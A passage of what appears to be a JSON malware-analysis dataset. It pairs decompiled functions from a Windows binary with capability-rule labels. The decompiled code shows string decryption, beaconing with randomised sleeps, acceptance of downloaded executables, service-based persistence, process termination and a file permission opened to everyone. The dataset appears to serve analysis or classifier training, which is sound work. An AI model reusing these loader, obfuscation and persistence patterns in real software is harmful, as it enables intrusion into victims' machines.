CONCAT31(uStack960._1_3_, 0x75);\n    uStack972 = 0x57;\n    uStack971 = 0x584b;\n    uStack969 = 0x32;\n    puStack988 = 0x6;\n    uStack992 = 0x8;\n    uStack968 = CONCAT22(uStack968._2_2_, 0x7575);\n    puStack996 = 0x407ee7;\n    puStack996 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1000 = 0x407eee;\n    pcStack940 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    puStack928 = NULL;\n    *pcStack940 = 0;\n    *(pcStack940 + 4) = 0;\n    puStack956 = &stack0xfffffc30 + -pcStack940;\n    do {\n        iVar13 = puStack928;\n        pcVar1 = puStack928 + pcStack940;\n        uStack1000 = 0x407f13;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uStack1000 = 6;\n        uVar2 = (&stack0xfffffc28)[iVar13 % 6];\n        uVar3 = pcVar1[puStack956];\n        uStack1000 = 0x407f30;\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        puStack928 = puStack928 + 1;\n    } while (puStack928 < 5);\n    uStack1000 = 0xb;\n    uStack1004 = 8;\n    uStack976 = 0xb045203;\n    uStack972 = 9;\n    uStack971 = 0x2a19;\n    uStack969 = 0x5e;\n    uStack968 = CONCAT22(uStack968._2_2_, 0x6f0e);\n    puStack984 = 0x6f6a3775;\n    uStack980 = 0x66;\n    uStack979 = 0x6b;\n    uStack1008 = 0x407f74;\n    uStack1008 = (*pcVar4)();\n    puStack1012 = 0x407f7b;\n    pcStack940 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    *pcStack940 = 0;\n    *(pcStack940 + 4) = 0;\n    *(pcStack940 + 8) = 0;\n    *(pcStack940 + 10) = 0;\n    iVar13 = 0;\n    uStack968 = &stack0xfffffc24 + -pcStack940;\n    do {\n        pcVar1 = iVar13 + pcStack940;\n        puStack1012 = 0x407fa1;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puStack1012 = 0x6;\n        uVar2 = (&stack0xfffffc1c)[iVar13 % 6];\n        uVar3 = pcVar1[uStack968];\n        puStack1012 = 0x407fbe;\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar13 = iVar13 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (iVar13 < 10);\n    puStack1012 = 0x15;\n    uStack1016 = 8;\n    puStack988 = 0xd282605;\n    puStack984 = 0x24074b44;\n    uStack980 = 0x24;\n    uStack979 = 0x10;\n    uStack978 = 0x5647;\n    uStack976 = 0x1133221e;\n    uStack972 = 0x5d;\n    uStack971 = 0xd5d;\n    uStack969 = 0x47;\n    puStack996 = 0x63414768;\n    uStack992 = CONCAT22(uStack992._2_2_, 0x3934);\n    uStack1020 = 0x408018;\n    uStack1020 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack960 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)();\n    *uStack960 = 0;\n    uStack960[1] = 0;\n    uStack960[2] = 0;\n    uStack960[3] = 0;\n    uStack960[4] = 0;\n    *(uStack960 + 5) = 0;\n    iVar13 = 0;\n    puVar14 = &stack0xfffffc18 + -uStack960;\n    uStack980 = SUB41(puVar14, 0);\n    uStack979 = puVar14 >> 8;\n    uStack978 = puVar14 >> 0x10;\n    do {\n        pcVar1 = iVar13 + uStack960;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = (&stack0xfffffc10)[iVar13 % 6];\n        uVar3 = pcVar1[CONCAT22(uStack978, CONCAT11(uStack979, uStack980))];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar13 = iVar13 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (iVar13 < 0x14);\n    uStack856 = 0xc25;\n    uStack854 = 0x3d0d;\n    uStack852 = 0x3908;\n    uStack850 = 0x1c0a;\n    uStack848 = 0x3911;\n    uStack846 = 0x1d25;\n    uStack844 = CONCAT31(uStack844._1_3_, 0x68);\n    uStack1008 = 0x56585368;\n    uStack1004 = CONCAT31(uStack1004._1_3_, 0x78);\n    uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    puVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar11);\n    *puVar9 = 0;\n    puVar9[1] = 0;\n    puVar9[2] = 0;\n    puVar9[3] = 0;\n    puVar9[4] = 0;\n    *(puVar9 + 5) = 0;\n    puStack1012 = &stack0xfffffc94 + -puVar9;\n    uStack992 = NULL;\n    do {\n        iVar13 = uStack992;\n        pcVar1 = uStack992 + puVar9;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = (&stack0xfffffc04)[iVar13 % 5];\n        uVar3 = pcVar1[puStack1012];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uStack992 = uStack992 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        pcVar4 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n    } while (uStack992 < 0x15);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(uStack968, uStack976);\n    (*pcVar4)(CONCAT13(uStack969, CONCAT21(uStack971, uStack972)), &stack0xfffffcc0);\n    (*pcVar4)(puStack988, 0x426264);\n    (*pcVar4)(puVar9, &stack0xfffffcf0);\n    uVar22 = 8;\n    uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    puVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n    puVar15 = puVar12;\n    for (iVar13 = 0x10; pcVar4 = _sym.imp.KERNEL32.dll_CreateThread,  iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar15 = 0;\n        puVar15 = puVar15 + 1;\n    }\n    *puVar12 = 0x20;\n    puVar12[1] = 0;\n    *0x427990 = (*pcVar4)(0, 0, fcn.004088e4, *0x4279dc, 0, 0);\n    *0x427994 = (*pcVar4)(0, 0, fcn.004030b6, puVar12, 0, 0);\n    uVar21 = 0;\n    uVar20 = 0;\n    *0x427998 = (*pcVar4)(0, 0, fcn.0040956f, puVar12, 0, 0);\n    uVar19 = 0;\n    uVar18 = 0;\n    uVar11 = (*pcVar4)(0, 0, fcn.00411da8, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar11);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar17 = 0;\n    uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar9);\n    pcVar6 = _sym.imp.ntdll.dll_RtlFreeHeap;\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar11);\n    uVar11 = (*pcVar5)(0, uVar21);\n    (*pcVar6)(uVar11);\n    uVar16 = 0;\n    uVar11 = (*pcVar5)(0, uVar20);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n    uVar11 = (*pcVar5)(0, uVar18);\n    (*pcVar4)(uVar11);\n    uVar11 = (*pcVar5)(0, uVar19);\n    (*pcVar6)(uVar11);\n    uVar11 = (*pcVar5)(0, uVar21);\n    (*pcVar4)(uVar11);\n    uVar11 = (*pcVar5)(0, uVar17);\n    (*pcVar6)(uVar11);\n    uVar11 = (*pcVar5)(0, uVar16);\n    (*pcVar6)(uVar11);\n    uVar11 = (*pcVar5)(0, uVar22);\n    (*pcVar6)(uVar11);\n    return 0;\n}\n",
        "token_count": 8751
    },
    "0040837d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.0040837d(void)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    char *pcVar7;\n    uint *puVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    uint lpWSAData;\n    uint ARG_0;\n    uint var_74h;\n    int32_t var_70h;\n    uint32_t var_6ch;\n    uint32_t var_68h;\n    int32_t *var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    char *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    char *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    var_74h = *0x427640;\n    var_68h = *0x427964;\n    var_60h = 0x1571a10;\n    var_5ch = 0x10162401;\n    var_58h = 0x2e0f0f5d;\n    var_54h = 0x155b161c;\n    var_50h = 0xc023015;\n    var_4ch = 0x3a131341;\n    var_48h = 0x481a0208;\n    var_44h = 0x4b43733b;\n    var_40h = 0x75525000;\n    var_3ch = 0x65044149;\n    var_ch = 0x65347871;\n    var_8h._0_2_ = 0x4264;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar7 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n    var_18h = pcVar7;\n    sub.ntdll.dll_memset(pcVar7, 0, 0x29);\n    var_4h = NULL;\n    var_14h = &var_60h - pcVar7;\n    do {\n        iVar10 = var_4h;\n        pcVar9 = pcVar7 + var_4h;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar1 = *(&var_ch + iVar10 % 6);\n        uVar2 = pcVar9[var_14h];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_4h = var_4h + 1;\n        *pcVar9 = cVar5 + ((uVar1 ^ uVar2) - cVar4);\n    } while (var_4h < 0x28);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    var_14h = 0;\n    var_4h = str.OG_vAY__;\n    do {\n        var_ch = 0;\n        var_6ch = 0;\n        iVar10 = 0;\n        var_10h = 1;\n        do {\n            if (var_4h[var_14h] != '\\0') {\n                cVar4 = *pcVar7;\n                pcVar9 = pcVar7;\n                while (cVar4 != var_4h[var_14h]) {\n                    if (cVar4 == '\\0') {\n                        bVar3 = false;\n                        goto code_r0x004084a9;\n                    }\n                    pcVar9 = pcVar9 + 1;\n                    cVar4 = *pcVar9;\n                }\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 0x20);\n        bVar3 = true;\ncode_r0x004084a9:\n        if (((*var_4h != '\\0') && (var_4h[0x1f] == '\\0')) && (bVar3)) {\n            var_38h = 0xb1f385b;\n            var_34h = 0x391d3d31;\n            puVar8 = &ARG_0;\n            for (iVar10 = 0x40; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            var_30h = 0x6b6c5a1b;\n            puVar8 = &var_28h;\n            for (iVar10 = 8; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            var_2ch._0_2_ = 0x4a10;\n            var_20h = 0x6e6f4a74;\n            var_1ch._0_2_ = 0x4e43;\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n            puVar8 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n            var_10h = 0;\n            *puVar8 = 0;\n            puVar8[1] = 0;\n            puVar8[2] = 0;\n            *(puVar8 + 3) = 0;\n            *(puVar8 + 0xe) = 0;\n            var_70h = &var_38h - puVar8;\n            do {\n                iVar10 = var_10h;\n                pcVar7 = var_10h + puVar8;\n                cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar1 = *(&var_20h + iVar10 % 6);\n                uVar2 = pcVar7[var_70h];\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                var_10h = var_10h + 1;\n                *pcVar7 = cVar5 + ((uVar1 ^ uVar2) - cVar4);\n            } while (var_10h < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, puVar8, var_74h);\n            iVar10 = fcn.004063e1(0, &ARG_0, &var_6ch, &var_ch);\n            if (iVar10 == 0) {\n                if (var_6ch == 0) {\n                    fcn.0041016b();\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n                    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n                    break;\n                }\n                if (var_28h < var_6ch) {\n                    fcn.0041016b();\n                    var_68h = var_68h * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_68h % 600000 + 60000);\n                }\n                else if (((4 < var_6ch) && (var_6ch == var_28h)) &&\n                        ((var_24h != NULL && ((*var_24h == 'M' && (var_24h[1] == 'Z')))))) {\n                    fcn.00410114();\n                    fcn.0041016b();\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n                    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n                    break;\n                }\n            }\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n            (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n            pcVar7 = var_18h;\n        }\n        var_4h = var_4h + 0x20;\n        var_14h = var_14h + 1;\n    } while (var_4h < 0x426260);\n    iVar10 = *var_64h;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n    return iVar10 != 0;\n}\n",
        "token_count": 1992
    },
    "004088e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00408943)\n\nuint __cdecl fcn.004088e4(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar3 = *0x427964;\n    puVar4 = 0x4279d0;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.00408295();\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    iVar2 = 600000;\n    while ((*pcVar1)(iVar2),  *0x427bb4 == 0) {\n        fcn.00408295();\n        iVar2 = fcn.0040837d();\n        if (iVar2 != 0) {\n            fcn.0041016b();\n        }\n        uVar3 = uVar3 * 0x19660d + 0x3c6ef35f;\n        iVar2 = uVar3 % 600000 + 60000;\n    }\n    return 0;\n}\n",
        "token_count": 279
    },
    "0040956f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040956f(void)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    code cVar3;\n    char cVar4;\n    char cVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint unaff_ESI;\n    uchar *puVar10;\n    int32_t iVar11;\n    uint uVar12;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint32_t uStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack64;\n    uint uStack60;\n    ushort uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    ushort uStack36;\n    uchar uStack34;\n    uint uStack33;\n    uint uStack29;\n    uchar uStack25;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    uStack84 = 5000;\n    uStack88 = 0x409588;\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x4279d8 == 0) {\n        do {\n            uStack88 = 0x409596;\n            fcn.00409411();\n            uStack88 = 60000;\n            iStack92 = 0x40959d;\n            (*pcVar1)();\n        } while( true );\n    }\n    uStack88 = 0x208;\n    iStack92 = 8;\n    uStack60 = 0;\n    puStack64 = NULL;\n    uStack96 = 0x4095b8;\n    uStack96 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack100 = 0x4095bf;\n    puStack64 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    if (puStack64 == NULL) {\n        return 0;\n    }\n    uStack52 = 0x6b2a774c;\n    uStack48 = 0x771a460f;\n    uStack44 = 0x46136b0d;\n    puVar10 = puStack64;\n    for (iVar9 = 0x208; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack100 = 0x39;\n    iStack104 = 8;\n    uStack40 = 0x6b2b7704;\n    uStack36 = 0x4619;\n    uStack34 = 6;\n    uStack33 = 0x536b0d77;\n    uStack29 = 0x79773546;\n    uStack25 = 0x6b;\n    uStack60 = 0x6b797769;\n    uStack56 = 0x4676;\n    uStack108 = 0x40962e;\n    uStack108 = (*pcVar6)();\n    pcVar6 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)();\n    uVar7 = 0;\n    do {\n        pcVar6[uVar7] = pcVar6[uVar7] + -0x39;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x39);\n    sub.ntdll.dll_memset();\n    puVar10 = &stack0xffffffc0 + -pcVar6;\n    iStack92 = 0;\n    do {\n        iVar9 = iStack92;\n        pcVar1 = pcVar6 + iStack92;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = (&stack0xffffffb8)[iVar9 % 6];\n        cVar3 = pcVar1[puVar10];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iStack92 = iStack92 + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ cVar3) - cVar4);\n    } while (iStack92 < 0x1c);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n    (*_sym.imp.SHLWAPI.dll_StrCatW)();\n    iVar9 = fcn.00409a17(&stack0xffffff94);\n    if (iVar9 != 0) goto code_r0x004097e2;\n    iVar9 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)();\n    uStack96 = iVar9 != 0;\n    iVar9 = fcn.00409d1f(uStack108);\n    if ((iVar9 != 0) || (iStack104 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0),  iStack104 == 0))\n    goto code_r0x004097e2;\n    uVar12 = 1;\n    iVar11 = 2;\n    puVar8 = (*_sym.imp.ADVAPI32.dll_CreateServiceW)\n                       (iStack104, *0x427978, *0x427978, 0xf01ff, 0x10, 2, 1, unaff_ESI, 0, 0, 0);\n    iVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (iVar9 == 0x431) {\n        puVar8 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(uVar12, *0x427978, 0xf01ff);\n        if (puVar8 != NULL) {\n            (*_sym.imp.ADVAPI32.dll_ControlService)(puVar8, 1, &stack0xffffff78);\n            goto code_r0x0040977f;\n        }\n    }\n    else {\ncode_r0x0040977f:\n        if (puVar8 != NULL) {\n            iVar9 = (*_sym.imp.ADVAPI32.dll_StartServiceW)(puVar8, 0, 0);\n            pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n            if ((iVar9 != 0) && (iVar11 != 0)) {\n                puVar8 = 0x427860;\n                do {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(*puVar8, 0);\n                    (*pcVar1)(*puVar8);\n                    puVar8 = puVar8 + 1;\n                } while (puVar8 < 0x427960);\n                (*pcVar1)(*0x42785c);\n                fcn.0041039d();\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n                pcVar6 = pcVar1;\n            }\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(puVar8);\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar12);\ncode_r0x004097e2:\n    uVar7 = 0;\n    do {\n        pcVar6[uVar7] = pcVar6[uVar7] ^ 0x16;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x39);\n    uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar12);\n    return 0;\n}\n",
        "token_count": 1648
    },
    "004098e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004098e0(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "0040a465": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a465(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    uVar6 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x0040a49f;\n            } while (param_1[pcVar2] != '\\\\');\n            pcVar2 = param_1 + pcVar2;\n            if (pcVar2 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar2 + 1));\n                param_1 = pcVar2 + 1;\n            }\n        }\ncode_r0x0040a49f:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar3 = pcVar2;\n            pcVar5 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar5 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar3 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar3 = pcVar3 + 1;\n            }\n            pcVar2[pcVar5] = '\\0';\n            cVar4 = *pcVar2;\n            pcVar3 = pcVar2;\n            while (cVar4 != '\\0') {\n                cVar4 = *pcVar3;\n                if (cVar4 + 0x9fU < 0x1a) {\n                    cVar4 = cVar4 + -0x20;\n                }\n                *pcVar3 = cVar4;\n                pcVar3 = pcVar3 + 1;\n                cVar4 = *pcVar3;\n            }\n            uVar6 = fcn.0040385e();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 646
    },
    "0040a614": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040a614(uint param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    char cVar7;\n    char cVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint SidToCheck;\n    uint var_14h;\n    uint var_10h;\n    uint cbSid;\n    uint *var_8h;\n    int32_t IsMember;\n    \n    *0x427a18 = param_1;\n    *0x427a20 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x4279e8 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x4279e0 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.0040dcd0();\n    fcn.0040a5a3();\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    *0x427a1c = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n    if (*0x427a1c != 0) {\n        cbSid = 0x10;\n        iVar10 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x427a1c, &cbSid);\n        if (iVar10 == 0) {\n            var_28h = 0x51247810;\n            var_24h = 0x780b4b08;\n            var_20h = 0x4b145125;\n            var_1ch._0_2_ = 0x7845;\n            var_14h = 0x516a7845;\n            var_10h._0_2_ = 0x4b43;\n            uVar9 = (*pcVar5)(8, 0x1d);\n            var_8h = (*pcVar4)(uVar9);\n            uVar11 = 0;\n            do {\n                *(var_8h + uVar11) = *(var_8h + uVar11) ^ 0xf4;\n                uVar11 = uVar11 + 1;\n            } while (uVar11 < 0x1d);\n            puVar12 = var_8h;\n            for (iVar10 = 7; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar12 = 0;\n                puVar12 = puVar12 + 1;\n            }\n            IsMember = 0;\n            *puVar12 = 0;\n            iVar10 = &var_28h - var_8h;\n            do {\n                iVar6 = IsMember;\n                pcVar1 = var_8h + IsMember;\n                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_14h + iVar6 % 6);\n                uVar3 = pcVar1[iVar10];\n                cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                puVar12 = var_8h;\n                IsMember = IsMember + 1;\n                *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n            } while (IsMember < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x427a1c, var_8h);\n            uVar11 = 0;\n            do {\n                pcVar1 = puVar12 + uVar11;\n                *pcVar1 = *pcVar1 + '2';\n                uVar11 = uVar11 + 1;\n            } while (uVar11 < 0x1d);\n            uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar12);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n        }\n        fcn.0040a22a();\n    }\n    iVar10 = (*_sym.imp.SHELL32.dll_IsUserAnAdmin)();\n    if (iVar10 == 0) {\n        IsMember = 0;\n        cbSid = 0xc;\n        IsMember = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &SidToCheck, &cbSid);\n        if (IsMember != 0) {\n            (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, &SidToCheck, &IsMember);\n            *0x427a10 = 1;\n            if (IsMember != 0) goto code_r0x0040a7c7;\n        }\n        *0x427a10 = 2;\n    }\n    else {\n        if (5 < *0x4279e8) {\n            iVar10 = fcn.0040aace();\n            if (iVar10 == 0) {\n                *0x427a10 = 3;\n                goto code_r0x0040a7c7;\n            }\n        }\n 